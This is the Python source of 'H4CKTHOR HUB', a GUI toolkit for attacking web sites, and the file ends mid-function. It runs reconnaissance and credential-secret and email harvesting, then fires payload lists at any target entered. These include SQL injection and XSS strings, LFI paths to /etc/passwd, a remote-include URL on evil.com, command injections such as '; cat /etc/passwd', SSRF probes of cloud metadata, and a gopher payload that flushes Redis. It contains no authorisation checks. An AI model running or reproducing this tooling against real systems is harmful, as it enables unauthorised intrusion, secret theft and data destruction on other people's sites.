import customtkinter as ctk
import threading
import socket
import requests
import urllib.parse
import time
import re
import os
import json
import base64
from datetime import datetime
from bs4 import BeautifulSoup
import urllib3
import dns.resolver
import dns.exception
import websocket
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class H4ckthorHub(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("H4CKTHOR HUB - V20 NEPTUNE EDITION")
        self.geometry("1550x980")
        
        self.is_running = {}
        self.agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'}
        self.session_results = []

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.sidebar = ctk.CTkFrame(self, width=340, corner_radius=0, fg_color="#010101")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_propagate(False)
        
        ctk.CTkLabel(self.sidebar, text="H4CKTHOR HUB", font=("Orbitron", 24, "bold"), text_color="#00FF00").pack(pady=15)

        self.scrollable_menu = ctk.CTkScrollableFrame(self.sidebar, fg_color="transparent")
        self.scrollable_menu.pack(fill="both", expand=True, padx=5, pady=5)

        self.setup_menu()
        self.setup_frames()
        self.configure_tags()
        self.show_page("sqli")

    def setup_menu(self):
        ctk.CTkLabel(self.scrollable_menu, text="=== PASSIVE RECON ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(5,5), anchor="w")
        passive = [
            ("Port Scan", "port"), ("Subdomain", "sub"),
            ("Reverse IP", "rev"), ("Whois", "whois"), 
            ("WAF Detect", "waf"), ("JS Secrets", "js"), 
            ("Headers", "header"), ("DNS Enum", "dns"),
            ("Email Harvester", "email"), ("CMS Detect", "cms"),
            ("CVE Scanner", "cve"), ("GraphQL", "graphql")
        ]
        self.add_menu_group(passive, "#004d40")

        ctk.CTkLabel(self.scrollable_menu, text="=== ACTIVE ATTACK ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(10,5), anchor="w")
        active = [
            ("SQLi Tester", "sqli"), ("Shell Hunter", "shell"),
            ("Admin Finder", "admin"), ("Dirsearch", "dir"),
            ("XSS Scanner", "xss"), ("LFI/RFI", "lfi"),
            ("Cmd Inject", "cmd"), ("SSRF", "ssrf"),
            ("WebSocket", "wsfuzz")
        ]
        self.add_menu_group(active, "#b71c1c")

        ctk.CTkLabel(self.scrollable_menu, text="=== SYSTEM UTILS ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(10,5), anchor="w")
        utils = [
            ("Exploit Arch", "arch"), ("JWT Exploit", "jwt"),
            ("Full Report", "report")
        ]
        self.add_menu_group(utils, "#1a237e")

    def add_menu_group(self, items, hover_clr):
        for text, pid in items:
            self.is_running[pid] = False
            btn = ctk.CTkButton(self.scrollable_menu, text=text, command=lambda p=pid: self.show_page(p), 
                          height=32, font=("Courier New", 12, "bold"), fg_color="transparent", 
                          hover_color=hover_clr, border_width=1, border_color="#00FF00", anchor="w")
            btn.pack(pady=2, padx=10, fill="x")

    def setup_frames(self):
        self.pages = {}
        all_pids = [
            "port","sub","rev","whois","waf","js","header","dns","email","cms","cve","graphql",
            "sqli","shell","admin","dir","xss","lfi","cmd","ssrf","wsfuzz",
            "arch","jwt","report"
        ]
        for pid in all_pids:
            frame = ctk.CTkFrame(self, corner_radius=20, fg_color="#050505", border_width=1, border_color="#00FF00")
            frame.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(frame, text=f"// {pid.upper()} ENGINE //", font=("Orbitron", 18, "bold"), text_color="#00FF00").pack(pady=8)
            
            st_lbl = ctk.CTkLabel(frame, text="STATUS: READY", font=("Courier New", 11, "bold"), text_color="#555555")
            st_lbl.pack()
            setattr(self, f"{pid}_status", st_lbl)
            
            ent = ctk.CTkEntry(frame, placeholder_text="Target URL, Domain or JWT Token...", width=700, height=40, fg_color="#0a0a0a", border_color="#00FF00", font=("Courier New", 12))
            ent.pack(pady=8)
            setattr(self, f"{pid}_ent", ent)
            
            btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
            btn_frame.pack(pady=5)
            
            start_btn = ctk.CTkButton(btn_frame, text="EXECUTE", command=lambda p=pid: self.start_engine(p), fg_color="#1b5e20", height=35, width=100, font=("Orbitron", 11, "bold"))
            start_btn.pack(side="left", padx=8)
            
            stop_btn = ctk.CTkButton(btn_frame, text="STOP", command=lambda p=pid: self.stop_engine(p), fg_color="#8b0000", height=35, width=100, font=("Orbitron", 11, "bold"))
            stop_btn.pack(side="left", padx=8)
            
            txt = ctk.CTkTextbox(frame, font=("Courier New", 13), border_width=1, border_color="#004d40", fg_color="#010101", text_color="#FFFFFF")
            txt.pack(padx=25, pady=10, fill="both", expand=True)
            setattr(self, f"{pid}_res", txt)
            
            self.pages[pid] = frame

    def show_page(self, pid):
        for p in self.pages.values(): p.grid_forget()
        self.pages[pid].grid(row=0, column=1, padx=20, pady=20, sticky="nsew")

    def log(self, pid, msg, tag="info"):
        widget = getattr(self, f"{pid}_res")
        ts = datetime.now().strftime("%H:%M:%S")
        widget.insert("end", f"[{ts}] {msg}\n", tag)
        widget.see("end")
        self.session_results.append(f"[{pid.upper()}] {ts} - {msg}")

    def configure_tags(self):
        for pid in self.pages.keys():
            txt = getattr(self, f"{pid}_res")
            txt.tag_config("ok", foreground="#00FFFF")
            txt.tag_config("fail", foreground="#FF0000")
            txt.tag_config("info", foreground="#00FF00")
            txt.tag_config("warn", foreground="#FFA500")
            txt.tag_config("vuln", foreground="#FF00FF")

    def animate(self, pid):
        chars = ["◐", "◓", "◑", "◒"]
        i = 0
        while self.is_running.get(pid, False):
            getattr(self, f"{pid}_status").configure(text=f"STATUS: RUNNING {chars[i%4]}", text_color="#00FF00")
            i += 1
            time.sleep(0.2)
        getattr(self, f"{pid}_status").configure(text="STATUS: STOPPED", text_color="#FF5555")

    def start_engine(self, pid):
        if self.is_running.get(pid, False):
            self.log(pid, "Engine already running. Stop it first.", "warn")
            return
        target = getattr(self, f"{pid}_ent").get().strip()
        if pid not in ["report", "jwt"] and not target:
            self.log(pid, "Please enter a valid target.", "fail")
            return
        self.is_running[pid] = True
        getattr(self, f"{pid}_res").delete("1.0", "end")
        threading.Thread(target=self.animate, args=(pid,), daemon=True).start()
        threading.Thread(target=getattr(self, f"logic_{pid}"), args=(target,), daemon=True).start()

    def stop_engine(self, pid):
        if self.is_running.get(pid, False):
            self.is_running[pid] = False
            self.log(pid, "Stop signal sent. Engine will terminate.", "warn")
        else:
            self.log(pid, "Engine is not running.", "info")

    # ========================== PASSIVE RECON ==========================
    def logic_port(self, target):
        host = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("port", f"Target: {host}")
        try:
            ip = socket.gethostbyname(host)
            ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,8888,27017]
            for p in ports:
                if not self.is_running["port"]: break
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((ip, p)) == 0:
                    banner = self._grab_banner(host, p)
                    self.log("port", f"PORT {p:<5} OPEN | Service: {banner}", "ok")
                s.close()
        except Exception as e:
            self.log("port", f"Resolution failed: {str(e)}", "fail")
        self.is_running["port"] = False

    def _grab_banner(self, host, port):
        try:
            if port in [80,8080]:
                r = requests.get(f"http://{host}:{port}", headers=self.agent, timeout=2, verify=False)
                return r.headers.get('Server', f'HTTP {r.status_code}')
            elif port in [443,8443]:
                r = requests.get(f"https://{host}:{port}", headers=self.agent, timeout=2, verify=False)
                return r.headers.get('Server', f'HTTPS {r.status_code}')
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((host, port))
                    s.send(b"\r\n")
                    banner = s.recv(256).decode(errors='ignore').strip()
                    return banner[:60]
        except:
            return "Unknown"

    def logic_sub(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("sub", f"Subdomain enumeration for: {domain}")
        try:
            r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
            self.log("sub", r.text, "ok")
        except:
            self.log("sub", "API error.", "fail")
        self.is_running["sub"] = False

    def logic_rev(self, target):
        host = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("rev", f"Reverse IP for: {host}")
        try:
            r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={host}", timeout=10)
            self.log("rev", r.text, "ok")
        except:
            self.log("rev", "API unreachable.", "fail")
        self.is_running["rev"] = False

    def logic_whois(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("whois", f"Whois query: {domain}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("whois.iana.org", 43))
            s.send(f"{domain}\r\n".encode())
            data = b""
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
            s.close()
            self.log("whois", data.decode(errors='ignore')[:3000], "ok")
        except Exception as e:
            self.log("whois", f"Whois failed: {str(e)}", "fail")
        self.is_running["whois"] = False

    def logic_waf(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("waf", "WAF detection...")
        waf_signatures = {
            "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "Akamai": ["akamai", "x-akamai-transformed"],
            "Incapsula": ["incapsula", "x-cdn", "visid_incap"],
            "Barracuda": ["barracuda", "cuda"],
            "AWS WAF": ["aws-waf", "x-amzn-requestid"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["bigip", "f5"],
            "Imperva": ["imperva", "x-iinfo"],
            "Wordfence": ["wordfence", "wfvt"]
        }
        detected = []
        try:
            r = requests.get(url + "/?id=' OR 1=1--", headers=self.agent, timeout=5, verify=False)
            headers_str = str(r.headers).lower()
            cookies_str = str(r.cookies).lower()
            html = r.text.lower()
            for waf, patterns in waf_signatures.items():
                for pat in patterns:
                    if pat in headers_str or pat in cookies_str or pat in html:
                        detected.append(waf)
                        break
            if detected:
                unique = list(set(detected))
                self.log("waf", f"WAF detected: {', '.join(unique)}", "fail")
            else:
                self.log("waf", "No common WAF detected.", "ok")
        except Exception as e:
            self.log("waf", f"Detection error: {str(e)}", "fail")
        self.is_running["waf"] = False

    def logic_js(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("js", "JS secret hunting...")
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            scripts = [urllib.parse.urljoin(url, s['src']) for s in soup.find_all('script', src=True)]
            for js in scripts:
                self.log("js", f"Found JS: {js}", "ok")
                try:
                    js_req = requests.get(js, headers=self.agent, timeout=4, verify=False)
                    secrets = re.findall(r'(api[_-]?key|token|secret|password|admin|aws[_-]?key|firebase|stripe|twilio)["\']?\s*[:=]\s*["\']([^"\']+)', js_req.text, re.I)
                    for stype, sval in secrets[:5]:
                        self.log("js", f"  Secret: {stype} = {sval[:40]}", "vuln")
                except:
                    pass
            if not scripts:
                self.log("js", "No external JS files.", "warn")
        except:
            self.log("js", "Failed to fetch page.", "fail")
        self.is_running["js"] = False

    def logic_header(self, target):
        url = target if target.startswith("http") else "https://" + target
        self.log("header", f"Headers for: {url}")
        try:
            r = requests.get(url, headers=self.agent, timeout=7, verify=False)
            for k,v in r.headers.items():
                self.log("header", f"{k}: {v}", "ok")
        except:
            self.log("header", "Connection error.", "fail")
        self.is_running["header"] = False

    def logic_dns(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("dns", f"DNS enumeration for: {domain}")
        try:
            import dns.resolver
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SPF']
            for rtype in record_types:
                if not self.is_running["dns"]:
                    break
                try:
                    answers = dns.resolver.resolve(domain, rtype)
                    for ans in answers:
                        self.log("dns", f"[{rtype}] {ans}", "ok")
                except dns.resolver.NoAnswer:
                    continue
                except dns.resolver.NXDOMAIN:
                    self.log("dns", f"Domain {domain} does not exist.", "fail")
                    break
                except Exception as e:
                    self.log("dns", f"{rtype} error: {str(e)}", "fail")
            try:
                ns_answers = dns.resolver.resolve(domain, 'NS')
                for ns in ns_answers:
                    if not self.is_running["dns"]: break
                    try:
                        dns.query.xfr(str(ns), domain, timeout=3)
                        self.log("dns", f"AXFR possible from {ns} - zone transfer!", "vuln")
                    except:
                        pass
            except:
                pass
        except ImportError:
            self.log("dns", "dnspython not installed. Run: pip install dnspython", "fail")
        except Exception as e:
            self.log("dns", f"DNS error: {str(e)}", "fail")
        self.is_running["dns"] = False

    def logic_email(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("email", f"Email harvesting from: {url}")
        emails = set()
        visited = set()
        to_crawl = [url]
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        try:
            while to_crawl and self.is_running["email"]:
                current = to_crawl.pop(0)
                if current in visited:
                    continue
                visited.add(current)
                self.log("email", f"Crawling: {current}")
                try:
                    r = requests.get(current, headers=self.agent, timeout=5, verify=False)
                    soup = BeautifulSoup(r.text, 'html.parser')
                    text = soup.get_text()
                    found = re.findall(email_pattern, text)
                    for email in found:
                        emails.add(email)
                    for a in soup.find_all('a', href=True):
                        link = urllib.parse.urljoin(url, a['href'])
                        if url in link and link not in visited and len(to_crawl) < 30:
                            to_crawl.append(link)
                except:
                    continue
            if emails:
                self.log("email", f"Found {len(emails)} unique email(s):", "ok")
                for email in sorted(emails):
                    self.log("email", f"{email}", "ok")
            else:
                self.log("email", "No email addresses found.", "warn")
        except Exception as e:
            self.log("email", f"Harvest error: {str(e)}", "fail")
        self.is_running["email"] = False

    def logic_cms(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cms", f"CMS detection for: {url}")
        detected = False
        try:
            r = requests.get(url, headers=self.agent, timeout=8, verify=False)
            html = r.text.lower()
            headers = str(r.headers).lower()
            cookies = str(r.cookies).lower()
            if 'wp-content' in html or 'wp-includes' in html or 'wordpress' in headers:
                self.log("cms", "WordPress detected", "ok")
                detected = True
                if 'wp-json' in html:
                    self.log("cms", "REST API enabled", "info")
                if 'wp-version' in html:
                    ver = re.search(r'wp-version[=:]["\']?([0-9.]+)', html)
                    if ver: self.log("cms", f"Version hint: {ver.group(1)}", "info")
            if 'joomla' in html or 'joomla!' in html or 'media/system/js' in html:
                self.log("cms", "Joomla detected", "ok")
                detected = True
                if 'joomla! version' in html:
                    ver = re.search(r'joomla! version ([0-9.]+)', html)
                    if ver: self.log("cms", f"Version: {ver.group(1)}", "info")
            if 'drupal' in html or 'drupal.settings' in html or 'sites/default/files' in html:
                self.log("cms", "Drupal detected", "ok")
                detected = True
                if 'drupal version' in html:
                    ver = re.search(r'drupal version ([0-9.]+)', html)
                    if ver: self.log("cms", f"Version: {ver.group(1)}", "info")
            if 'magento' in html or 'skin/frontend' in html or 'Magento' in cookies:
                self.log("cms", "Magento detected", "ok")
                detected = True
            if 'shopify' in html or 'cdn.shopify.com' in html or 'Shopify.theme' in html:
                self.log("cms", "Shopify detected", "ok")
                detected = True
            if 'wix.com' in html or 'wix' in headers:
                self.log("cms", "Wix detected", "ok")
                detected = True
            if 'expressionengine' in html:
                self.log("cms", "ExpressionEngine detected", "ok")
                detected = True
            if not detected:
                self.log("cms", "No recognizable CMS detected.", "warn")
        except Exception as e:
            self.log("cms", f"Detection failed: {str(e)}", "fail")
        self.is_running["cms"] = False

    def logic_cve(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cve", f"CVE scanning for: {url}")
        try:
            r = requests.get(url, headers=self.agent, timeout=8, verify=False)
            server = r.headers.get('Server', '')
            powered = r.headers.get('X-Powered-By', '')
            html = r.text.lower()
            cve_list = []
            if 'apache' in server.lower():
                if '2.4.49' in server or '2.4.50' in server:
                    cve_list.append("CVE-2021-41773 (Path Traversal/RCE)")
                if '2.4.48' in server:
                    cve_list.append("CVE-2021-40438 (Proxy SSRF)")
            if 'nginx' in server.lower():
                cve_list.append("CVE-2021-23017 (Buffer Overflow)")
            if 'php' in powered.lower():
                if '7.4' in powered:
                    cve_list.append("CVE-2022-31625 (PHP RCE)")
            if 'wp-content' in html:
                cve_list.append("WordPress: Check plugins/themes CVEs")
            if 'joomla' in html:
                cve_list.append("Joomla: CVE-2023-23752 (Unauthenticated access)")
            if cve_list:
                for cve in cve_list:
                    self.log("cve", f"Potential: {cve}", "vuln")
            else:
                self.log("cve", "No immediate CVE matches from headers.", "info")
        except Exception as e:
            self.log("cve", f"Error: {str(e)}", "fail")
        self.is_running["cve"] = False

    def logic_graphql(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        endpoints = ["/graphql", "/v1/graphql", "/api/graphql", "/graph", "/gql", "/query"]
        introspection_query = '{"query":"query { __schema { types { name fields { name } } } }"}'
        self.log("graphql", "Searching for GraphQL endpoints...")
        found = False
        for ep in endpoints:
            if not self.is_running["graphql"]: break
            test_url = url + ep
            self.log("graphql", f"Testing {test_url}")
            try:
                r = requests.post(test_url, headers=self.agent, data=introspection_query, timeout=5, verify=False)
                if r.status_code == 200 and '"__schema"' in r.text:
                    self.log("graphql", f"GraphQL endpoint found: {test_url}", "ok")
                    self.log("graphql", "Introspection enabled! Dumping schema...", "vuln")
                    try:
                        schema = r.json()
                        types = schema.get('data', {}).get('__schema', {}).get('types', [])
                        for t in types[:20]:
                            name = t.get('name')
                            fields = t.get('fields', [])
                            if fields:
                                self.log("graphql", f"Type {name}: {[f['name'] for f in fields[:5]]}", "info")
                    except:
                        pass
                    found = True
                elif r.status_code == 200:
                    self.log("graphql", f"Possible GraphQL at {test_url} (no introspection)", "warn")
                    found = True
            except:
                pass
        if not found:
            self.log("graphql", "No GraphQL endpoints found.", "warn")
        self.is_running["graphql"] = False

    # ========================== ACTIVE ATTACK ==========================
    def logic_sqli(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("sqli", "Crawling for injection points...")
        try:
            res = requests.get(url, headers=self.agent, timeout=5, verify=False)
            soup = BeautifulSoup(res.text, 'html.parser')
            links = list(set([urllib.parse.urljoin(url, a['href']) for a in soup.find_all('a', href=True) if url in urllib.parse.urljoin(url, a['href'])]))
            if not links: links = [url]
            vulnerable = False
            payloads = ["'", "\"", "') OR '1'='1", "1 AND 1=1--", "1 AND 1=2--", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 1=1--", "' UNION SELECT NULL--"]
            for l in links[:15]:
                if not self.is_running["sqli"]: break
                parsed = urllib.parse.urlparse(l)
                params = urllib.parse.parse_qs(parsed.query)
                if not params:
                    continue
                for param in params.keys():
                    for p in payloads:
                        if not self.is_running["sqli"]: break
                        new_qs = urllib.parse.urlencode({param: p})
                        test_url = l.replace(parsed.query, new_qs) if parsed.query else l + "?" + new_qs
                        self.log("sqli", f"Testing: {test_url}")
                        try:
                            r = requests.get(test_url, timeout=4, verify=False)
                            if any(x in r.text.lower() for x in ["sql syntax", "mysql_fetch", "sqlite3", "postgresql error", "warning: mysql", "odbc driver", "microsoft ole db"]):
                                self.log("sqli", f"VULNERABLE: {test_url}", "vuln")
                                vulnerable = True
                                break
                        except:
                            pass
            if not vulnerable:
                self.log("sqli", "No SQLi vulnerabilities detected.", "fail")
            else:
                self.log("sqli", "SQLi scan completed.", "ok")
        except Exception as e:
            self.log("sqli", f"Crawl error: {str(e)}", "fail")
        self.is_running["sqli"] = False

    def logic_shell(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        self.log("shell", "Searching for shell/upload paths...")
        paths = [
            "/upload.php","/admin/upload.php","/shell.php","/cmd.php","/backdoor.php","/v1/upload",
            "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php","/cgi-bin/php",
            "/cgi-bin/php5","/upload","/uploads","/fileupload","/user/upload","/api/upload",
            "/uploadify/uploadify.php","/wp-admin/admin-ajax.php","/wp-content/themes/upload.php"
        ]
        found = False
        for p in paths:
            if not self.is_running["shell"]: break
            self.log("shell", f"Testing {p}")
            try:
                r = requests.get(url+p, headers=self.agent, timeout=3, verify=False)
                if r.status_code != 404:
                    self.log("shell", f"FOUND: {p} (HTTP {r.status_code})", "ok")
                    found = True
            except:
                pass
        if not found:
            self.log("shell", "No shell paths detected.", "warn")
        self.is_running["shell"] = False

    def logic_admin(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        self.log("admin", "Searching for admin panels...")
        paths = [
            "/admin","/administrator","/login","/wp-login.php","/admin/login","/cp","/cpanel","/admincp",
            "/auth/login","/panel","/dashboard","/user/login","/backend","/controlpanel","/manage","/webadmin",
            "/siteadmin","/adminarea","/adm","/admin/index.php","/wp-admin","/administrator/index.php"
        ]
        found = False
        for p in paths:
            if not self.is_running["admin"]: break
            self.log("admin", f"Testing {p}")
            try:
                r = requests.get(url+p, headers=self.agent, timeout=3, verify=False)
                if r.status_code == 200:
                    self.log("admin", f"FOUND: {p} (200 OK)", "ok")
                    found = True
                elif r.status_code == 403:
                    self.log("admin", f"FORBIDDEN: {p} (403) - may exist", "warn")
            except:
                pass
        if not found:
            self.log("admin", "No admin panels detected.", "warn")
        self.is_running["admin"] = False

    def logic_dir(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        wordlist_path = "smash/wordlist.txt"
        words = []
        if os.path.exists(wordlist_path):
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                words = [line.strip() for line in f if line.strip()]
            self.log("dir", f"Loaded {len(words)} paths from {wordlist_path}", "info")
        else:
            words = ["backup","config","db","sql","temp","old","test","admin","user","uploads","images","css","js","includes","logs","error","download","robots.txt",".git",".env","swagger","api","v1","v2","private","wp-admin","phpmyadmin","mysql","cgi-bin","server-status","phpinfo.php","info.php",".htaccess",".htpasswd","xmlrpc.php"]
            self.log("dir", f"Wordlist not found. Using default {len(words)} entries.", "warn")
        self.log("dir", f"Brute-forcing {len(words)} paths...")
        found = False
        for w in words[:200]:
            if not self.is_running["dir"]: break
            self.log("dir", f"Checking /{w}")
            try:
                r = requests.get(f"{url}/{w}", headers=self.agent, timeout=2, verify=False)
                if r.status_code == 200:
                    self.log("dir", f"200 OK -> /{w}", "ok")
                    found = True
                elif r.status_code == 403:
                    self.log("dir", f"403 Forbidden -> /{w}", "warn")
                elif r.status_code == 301 or r.status_code == 302:
                    self.log("dir", f"{r.status_code} Redirect -> /{w} -> {r.headers.get('Location','')}", "info")
            except:
                pass
        if not found:
            self.log("dir", "No interesting directories found.", "warn")
        self.is_running["dir"] = False

    def logic_xss(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("xss", "XSS scanning...")
        payloads = [
            "<script>alert(1)</script>", "\"><svg/onload=alert(1)>", "javascript:alert(1)",
            "'-alert(1)-'", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>", "'';!--\"<XSS>=&{()}", "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>", "><script>alert(1)</script>", "\" onmouseover=alert(1) \""
        ]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            forms = soup.find_all('form')
            params = []
            for inp in soup.find_all(['input', 'textarea']):
                if inp.get('name'):
                    params.append(inp.get('name'))
            for a in soup.find_all('a', href=True):
                if '?' in a['href']:
                    params.extend(urllib.parse.parse_qs(urllib.parse.urlparse(a['href']).query).keys())
            params = list(set(params))
            vulnerable = False
            for param in params[:10]:
                if not self.is_running["xss"]: break
                for payload in payloads:
                    if not self.is_running["xss"]: break
                    test_url = url + f"?{param}={urllib.parse.quote(payload)}"
                    self.log("xss", f"Testing: {test_url}")
                    try:
                        resp = requests.get(test_url, headers=self.agent, timeout=4, verify=False)
                        if payload in resp.text and ('<' in payload or '>' in payload):
                            self.log("xss", f"VULNERABLE: {test_url}", "vuln")
                            vulnerable = True
                            break
                    except:
                        pass
            if not vulnerable:
                self.log("xss", "No XSS vulnerabilities detected.", "fail")
        except Exception as e:
            self.log("xss", f"Error: {str(e)}", "fail")
        self.is_running["xss"] = False

    def logic_lfi(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("lfi", "LFI/RFI scanning...")
        payloads = [
            "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd%00", "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd", "..;/..;/..;/etc/passwd",
            "http://evil.com/shell.txt", "https://evil.com/shell.txt"
        ]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("lfi", "No parameters found for LFI testing.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for payload in payloads:
                        if not self.is_running["lfi"]: break
                        test_qs = urllib.parse.urlencode({param: payload})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        self.log("lfi", f"Testing: {test_url}")
                        try:
                            resp = requests.get(test_url, headers=self.agent, timeout=4, verify=False)
                            if "root:x:" in resp.text or "[extensions]" in resp.text:
                                self.log("lfi", f"VULNERABLE (LFI): {test_url}", "vuln")
                                vulnerable = True
                                break
                            if "<?php" in resp.text and "shell" in payload:
                                self.log("lfi", f"VULNERABLE (RFI): {test_url}", "vuln")
                                vulnerable = True
                                break
                        except:
                            pass
                if not vulnerable:
                    self.log("lfi", "No LFI/RFI vulnerabilities found.", "fail")
        except Exception as e:
            self.log("lfi", f"Error: {str(e)}", "fail")
        self.is_running["lfi"] = False

    def logic_cmd(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cmd", "Command injection scanning...")
        payloads = [
            "; ls", "| dir", "& id", "`whoami`", "$(whoami)", "|| ping -c 1 127.0.0.1",
            "| ping -n 1 127.0.0.1", "; cat /etc/passwd", "& type C:\\Windows\\win.ini"
        ]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("cmd", "No parameters found for command injection.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for payload in payloads:
                        if not self.is_running["cmd"]: break
                        test_qs = urllib.parse.urlencode({param: payload})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        self.log("cmd", f"Testing: {test_url}")
                        try:
                            start = time.time()
                            resp = requests.get(test_url, headers=self.agent, timeout=5, verify=False)
                            elapsed = time.time() - start
                            if any(x in resp.text.lower() for x in ["root:x", "uid=", "windows directory", "drivers"]):
                                self.log("cmd", f"VULNERABLE (Command Injection): {test_url}", "vuln")
                                vulnerable = True
                                break
                            if elapsed > 4:
                                self.log("cmd", f"Possible time-based injection: {test_url}", "warn")
                        except:
                            pass
                if not vulnerable:
                    self.log("cmd", "No command injection vulnerabilities found.", "fail")
        except Exception as e:
            self.log("cmd", f"Error: {str(e)}", "fail")
        self.is_running["cmd"] = False

    def logic_ssrf(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("ssrf", "SSRF scanning...")
        internal_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:3306",
            "http://10.0.0.1",
            "https://169.254.169.254/latest/user-data/",
            "http://192.168.1.1",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
        ]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("ssrf", "No parameters found for SSRF testing.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for itarget in internal_targets:
                        if not self.is_running["ssrf"]: break
                        test_qs = urllib.parse.urlencode({param: itarget})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        self.log("ssrf", f"Testing: {test_url}")
                        try:
                            resp = requests.get(test_url, headers=self.agent, timeout=6, verify=False)
                            if "ami-id" in resp.text or "root" in resp.text or "instance-id" in resp.text:
                                self.log("ssrf", f"VULNERABLE (SSRF): {test_url}", "vuln")
                                vulnerable = True
                                break
                        except:
                            pass
                if not vulnerable:
                    self.log("ssrf", "No SSRF vulnerabilities found.", "fail")
        except Exception as e:
            self.log("ssrf", f"Error: {str(e)}", "fail")
        self.is_running["ssrf"] = False

    def logic_wsfuzz(self, target):
        url = target if target.startswith("ws") else "ws://" + target
        self.log("wsfuzz", "WebSocket fuzzing...")
        payloads = ["'", "\"", "<script>alert(1)</script>", "../../../etc/passwd", "; ls", "{\"$gt\": \"\"}"]
        try:
            ws = websocket.create_connection(url, timeout=5)
            self.log("wsfuzz", f"Connected to {url}", "ok")
            for payload in payloads:
                if not self.is_running["wsfuzz"]: break
                self.log("wsfuzz", f"Sending: {payload}")
                ws.send(payload)
                try:
                    response = ws.recv()
                    self.log("wsfuzz", f"Response: {response[:100]}", "info")
                    if any(x in response.lower() for x in ["error", "exception", "sql", "alert"]):
                        self.log("wsfuzz", f"Possible injection via: {payload}", "warn")
                except:
                    pass
            ws.close()
        except Exception as e:
            self.log("wsfuzz", f"WebSocket error: {str(e)}", "fail")
        self.is_running["wsfuzz"] = False

    # ========================== SYSTEM UTILS ==========================
    def logic_arch(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("arch", f"Exploit architecture for: {url}")
        try:
